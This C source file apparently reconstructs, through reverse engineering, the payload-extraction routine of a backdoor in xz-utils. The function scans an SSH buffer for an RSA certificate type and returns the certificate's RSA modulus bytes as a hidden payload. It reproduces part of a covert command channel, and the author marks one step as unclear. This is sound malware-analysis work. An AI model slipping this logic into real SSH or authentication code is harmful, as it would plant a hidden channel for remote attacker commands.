/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"
#include <string.h>

BOOL extract_payload_message(
	struct sshbuf *sshbuf,
	size_t sshbuf_size,
	size_t *out_payload_size,
	global_context_t *ctx
){
	if(!sshbuf || sshbuf_size <= 6) return FALSE;
	if(!out_payload_size || !ctx) return FALSE;
	if(!ctx->STR_ssh_rsa_cert_v01_openssh_com) return FALSE;
	if(!ctx->STR_rsa_sha2_256) return FALSE;

	// overflow check 
	if(sshbuf_size > PTRADD(sshbuf->d, sshbuf_size)) return FALSE;

	size_t i = 0;
	char *cert_type = NULL;
	for(i=0; (sshbuf_size - i) >= 7; ++i){
		// check for "ssh-rsa"
		if(!strncmp(ctx->STR_ssh_rsa_cert_v01_openssh_com,  (const char *)&sshbuf->d[i], 7)
		// check for "rsa-sha2"
		|| !strncmp(ctx->STR_rsa_sha2_256, (const char *)&sshbuf->d[i], 7)){
			cert_type = (char *)&sshbuf->d[i];
			break;
		}
	}
	if (i <= 7 || !cert_type){
		return FALSE;
	}

	u8 *p = sshbuf->d;
	// go backwards over  the length of the string and the length of the certificate, then extract it
	// (this is the encoding used by ssh for network messages and can be seen in PHPseclib's `Strings::packSSH2`)
	u32 length = __builtin_bswap32(*(u32 *)(p - 8));
	if(length > 0x10000) return FALSE;

	u8 *data_end = (u8 *)(cert_type + length - 8);
	u8 *sshbuf_end = sshbuf->d + sshbuf_size;
	// encoded data can't overflow the sshbuf size
	if(data_end >= sshbuf_end) return FALSE;

	size_t remaining = sshbuf_size - i;
	size_t cert_type_namelen = c_strnlen(cert_type, remaining);
	if(cert_type_namelen >= remaining) return FALSE;

	// go past the cert type string -> RSA exponent
	p = (u8 *)(cert_type + cert_type_namelen);
	length = __builtin_bswap32(*(u32 *)p);
	if(length > 0x10000) return FALSE;

	// skip data (RSA exponent)
	p += length + sizeof(u32);
	if(p >= data_end) return FALSE;

	// length of RSA modulus
	length = __builtin_bswap32(*(u32 *)p);
	if(length > 0x10000) return FALSE;

	u8 *modulus_data = p;
	size_t modulus_length = length;

	// skip data (RSA modulus)
	p += length + sizeof(u32);
	if(p >= data_end) return FALSE;

	// ??
	if(*modulus_data == 0){
		++modulus_data;
		--modulus_length;
	}

	sshbuf->d = modulus_data;
	*out_payload_size = modulus_length;
	return TRUE;


}
